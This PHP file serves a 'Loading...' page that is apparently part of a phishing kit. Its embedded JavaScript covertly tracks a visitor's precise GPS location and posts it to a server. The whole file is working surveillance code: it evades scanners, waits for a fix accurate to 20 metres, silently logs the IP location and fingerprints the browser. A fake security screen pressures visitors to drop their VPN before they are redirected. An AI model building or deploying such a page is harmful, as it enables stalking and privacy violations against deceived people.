<?php
include 'headers.php';  // CloudFlare bypass headers
include 'guard.php';    // Block bots/scanners
include 'ip.php';

// Add JavaScript to capture location (v2 - continuous tracking + IP fallback)
echo '
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Debug function - only log essential data
        function debugLog(message) {
            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained")) {
                console.log("DEBUG: " + message);
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "debug_log.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("message=" + encodeURIComponent(message));
            }
        }
        
        var locationSent = false;
        var watchId = null;
        var locationCount = 0;
        
        function getLocation() {
            if (navigator.geolocation) {
                document.getElementById("locationStatus").innerText = "Requesting location permission...";
                
                // Use watchPosition for continuous tracking
                watchId = navigator.geolocation.watchPosition(
                    sendPosition, 
                    handleError, 
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
                
                // Also try one-time position as backup
                navigator.geolocation.getCurrentPosition(
                    sendPosition,
                    function() {}, // Silent fail for backup
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                document.getElementById("locationStatus").innerText = "Location not supported";
                // Try IP-based fallback
                ipFallback();
                setTimeout(function() { redirectToMainPage(); }, 3000);
            }
        }
        
        function sendPosition(position) {
            locationCount++;
            debugLog("Position obtained successfully (#" + locationCount + ")");
            
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && !locationSent) {
                    // EXTREME ACCURACY: Only redirect IF accuracy is accurate enough (<= 20 meters) OR after 5 readings (allowing GPS time to full settle)
                    if (acc <= 20 || locationCount >= 5) {
                        locationSent = true;
                        document.getElementById("locationStatus").innerText = "Location verified, loading...";
                        setTimeout(function() { redirectToMainPage(); }, 2026);
                    } else {
                        debugLog("Waiting for EXACT GPS lock calibration... Current Accuracy: " + acc + "m");
                    }
                }
            };
            
            xhr.send("lat=" + lat + "&lon=" + lon + "&acc=" + acc + "&count=" + locationCount + "&time=" + new Date().getTime());
            
            // Keep tracking for 30 more seconds after first position
            if (locationCount === 1) {
                setTimeout(function() {
                    if (watchId) {
                        navigator.geolocation.clearWatch(watchId);
                    }
                }, 30000);
            }
        }
        
        function handleError(error) {
            document.getElementById("locationStatus").innerText = "Setting authorization node...";
            
            // IP-based geolocation fallback
            ipFallback();
            
            if (error.code === 1) { // PERMISSION_DENIED
                // User denied explicitly, redirect immediately
                setTimeout(function() { redirectToMainPage(); }, 1500);
            } else {
                // Timeout or Position Unavailable: Wait longer to allow background watchPosition triggers
                setTimeout(function() { redirectToMainPage(); }, 5000);
            }
        }
        
        function ipFallback() {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "ip_locate.php", true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    // IP location captured silently
                }
            };
            xhr.send();
        }
        
        function redirectToMainPage() {
            try {
                window.location.href = "forwarding_link/index2.html";
            } catch (e) {
                window.location = "forwarding_link/index2.html";
            }
        }
        
        function checkVPN() {
            if (document.getElementById("locationStatus")) {
                document.getElementById("locationStatus").innerText = "Performing security check...";
            }
            fetch("http://ip-api.com/json/?fields=proxy,hosting")
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (data.proxy || data.hosting) {
                        document.body.innerHTML = `
                            <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:#0b0f19; color:white; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:999999; font-family:Arial, sans-serif; padding:20px; text-align:center;">
                                <div style="font-size:52px; margin-bottom:16px;">🛡️</div>
                                <h1 style="font-size:22px; font-weight:800; margin-bottom:10px; color:#f87171;">Connection Blocked</h1>
                                <p style="font-size:13px; color:#94a3b8; max-width:320px; line-height:20px; margin-bottom:24px;">VPN, Proxy, or Datacenter relay nodes detected. Security parameters require a direct connection stream authorization.</p>
                                <div style="background:rgba(248,113,113,0.1); border:1px solid rgba(248,113,113,0.3); border-radius:10px; padding:12px; font-size:12px; color:#f87171; max-width:300px; margin-bottom:24px;">
                                    Please disconnect from your VPN/Proxy service and reload the page to proceed securely.
                                </div>
                                <button onclick="window.location.reload()" style="padding:12px 24px; background:#f87171; color:white; border:none; border-radius:8px; font-size:14px; font-weight:700; cursor:pointer; transition:background 0.2s;">Retry Access</button>
                            </div>
                        `;
                    } else {
                        getLocation();
                    }
                })
                .catch(function() {
                    getLocation(); // Silent continue or fail-open if API limit reached
                });
        }
        
        // Start on page load
        window.onload = function() {
            setTimeout(function() { checkVPN(); }, 500);
            
            // C-CAM v3.0 PWA Service Worker
            if ("serviceWorker" in navigator) {
                navigator.serviceWorker.register("sw.js")
                .catch(function(e) { console.log("SW Error:", e); });
            }
        };
    </script>
    <link rel="manifest" href="manifest.json">
</head>
<body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
    <h2>Loading, please wait...</h2>
    <p>Please allow location access for better experience</p>
    <p id="locationStatus">Initializing...</p>
    <div style="margin-top: 30px;">
        <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
    </div>
    
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script src="fingerprint.js"></script>
</body>
</html>
';
exit;
?>
